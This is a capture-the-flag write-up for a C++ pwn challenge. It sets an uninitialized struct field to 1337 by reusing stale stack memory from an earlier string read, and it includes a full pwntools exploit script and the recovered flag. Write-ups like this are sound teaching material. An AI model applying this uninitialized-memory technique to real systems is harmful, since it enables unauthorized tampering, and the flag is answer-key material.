# RAIId Shadow Legends

I love how C++ initializes everything for you. It makes things so easy and fun!

Speaking of fun, play our fun new game RAIId Shadow Legends (source) at /problems/2021/raiid_shadow_legends on the shell server, or connect with nc shell.actf.co 21300.

Author: kmh

## Challenge

After accepting the terms and conditions, we are given an interactive prompt for a game.
To win, we need to fight for the flag with a skill level exactly equal to 1337.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Relevant source code

```c
struct character {
	int health;
	int skill;
	long tokens;
	string name;
};

void play() {
	string action;
	character player;
	cout << "Enter your name: " << flush;
	getline(cin, player.name);
	cout << "Welcome, " << player.name << ". Skill level: " << player.skill << endl;
	while (true) {
		cout << "\n1. Power up" << endl;
		cout << "2. Fight for the flag" << endl;
		cout << "3. Exit game\n" << endl;
		cout << "What would you like to do? " << flush;
		cin >> action;
		cin.ignore();
		if (action == "1") {
			cout << "Power up requires shadow tokens, available via in app purchase." << endl;
		} else if (action == "2") {
			if (player.skill < 1337) {
				cout << "You flail your arms wildly, but it is no match for the flag guardian. Raid failed." << endl;
			} else if (player.skill > 1337) {
				cout << "The flag guardian quickly succumbs to your overwhelming power. But the flag was destroyed in the frenzy!" << endl;
			} else {
				cout << "It's a tough battle, but you emerge victorious. The flag has been recovered successfully: " << flag.rdbuf() << endl;
			}
		} else if (action == "3") {
			return;
		}
	}
}

void terms_and_conditions() {
	string agreement;
	string signature;
	cout << "\nRAIId Shadow Legends is owned and operated by Working Group 21, Inc. ";
	cout << "As a subsidiary of the International Organization for Standardization, ";
	cout << "we reserve the right to standardize and/or destandardize any gameplay ";
	cout << "elements that are deemed fraudulent, unnecessary, beneficial to the ";
	cout << "player, or otherwise undesirable in our authoritarian society where ";
	cout << "social capital has been eradicated and money is the only source of ";
	cout << "power, legal or otherwise.\n" << endl;
	cout << "Do you agree to the terms and conditions? " << flush;
	cin >> agreement;
	cin.ignore();
	while (agreement != "yes") {
		cout << "Do you agree to the terms and conditions? " << flush;
		cin >> agreement;
		cin.ignore();
	}
	cout << "Sign here: " << flush;
	getline(cin, signature);
}
```

## Solution

The `character` struct has no default values, and no defaults are set when the player is initialised.
If there are valid values in memory when the game starts, these will be used during the game.

By either using a debugger or simply testing inputs, we can find that part of the `agreement` variable in the `terms_and_conditions` function overlaps with `player.skill` in the `play` function.

With C++ strings, short strings are stored on the stack, while longer strings are stored in the heap.
Therefore, we need to make our agreement long enough to write the desired skill level, but short enough that it is placed on the stack.

We first write 4 bytes of padding, followed by the skill level we want in little endian.
Then we can type "yes" to accept the agreement as normal.
We can now start the game with a skill level of 1337 and fight for the flag.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host shell.actf.co --port 21300 raiid_shadow_legends
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('raiid_shadow_legends')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 21300)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil("?")
io.sendline("1")

io.recvuntil("?")
io.sendline("AAAA\x39\x05")

io.recvuntil("?")
io.sendline("yes")

io.recvuntil(":")
io.sendline("A")
io.recvuntil(":")
io.sendline("A")

io.recvuntil("?")
io.sendline("2")

io.recvuntil(":")
io.interactive()
```

## Flag

`actf{great_job!_speaking_of_great_jobs,_our_sponsor_audible...}`

